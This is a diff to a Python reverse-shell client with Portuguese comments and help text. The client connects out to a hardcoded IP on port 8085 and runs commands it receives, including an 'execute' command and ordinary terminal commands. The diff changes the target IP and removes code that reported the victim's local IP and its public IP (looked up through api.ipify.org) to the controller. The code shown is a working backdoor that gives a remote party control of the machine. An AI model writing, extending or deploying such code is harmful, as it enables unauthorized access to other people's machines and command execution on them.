@@ -2,9 +2,9 @@ import socket
 import time
 import subprocess
 import os
-import requests
 
-ip = "192.168.1.16"
+
+ip = "192.168.1.10"
 port = 8085
 
 def connection(ip, port):
@@ -13,15 +13,6 @@ def connection(ip, port):
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((ip, port))
             s.send(b"\n[!] Connection received.\n")
-            # Obtendo o IP local
-            ip_local = socket.gethostbyname(socket.gethostname())
-
-            # Obtendo o IP público
-            ip_publico = requests.get('https://api.ipify.org/').text
-
-            # Enviando os IPs para o cliente
-            send_data(s, f'[+] IP Local: {ip_local}\n')
-            send_data(s, f'[+] IP Público: {ip_publico}\n')
 
             return s
         except socket.error as e:
@@ -48,12 +39,8 @@ def listen(s):
 
 def cmd(s, data):
     try:
-        if data.startswith("ls"):
-            files = os.listdir(os.getcwd())
-            files_str = "\n".join(files)
-            send_data(s, files_str)
-        elif data.startswith("help"):
-            help_text = """##########
+        if data.startswith("help"):
+            help_text = """\n##########
 
 Manual:
 execute - antes dos comandos de execução ex: python3 file.py; 
@@ -64,7 +51,7 @@ ls - listar pastas e arquivos;
 
 OBS: Você pode executar muitos comandos do próprio terminal normalmente
 
-##########"""
+##########\n\n"""
             send_data(s, help_text)
         elif data.startswith("execute"):
             arquivo = data.split(" ", 1)[1]
